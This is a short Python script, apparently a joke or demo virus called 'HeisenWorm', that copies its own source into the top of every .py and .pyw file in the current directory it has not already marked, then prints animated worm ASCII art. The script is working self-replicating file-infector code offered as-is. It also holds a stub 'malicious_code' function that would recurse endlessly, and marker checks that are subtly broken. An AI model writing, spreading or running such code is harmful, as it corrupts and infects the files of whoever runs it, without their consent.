#!/usr/bin/env python3

print("HeisenWorm Sparks Cigar")

# VIRUS SAYS HI!

import sys
import glob
import time
virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
        if line == "# VIRUS SAYS HI!":
                self_replicating_part = True
        if not self_replicating_part:
                virus_code.append(line)
        if line == "# VIRUS SAYS BYE!":
                break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():

        malicious_code()

def grow():
    for size in range(1, 11):
        heisenworm = "     __    \n  __|  |__ \n*--(n_n)_)_)_)_)" + "_)" * (size - 1)
        print(heisenworm)
        time.sleep(1)

if __name__ == "__main__":
    grow()
# VIRUS SAYS BYE!

print('HeisenWorm Says "Say My Name"')
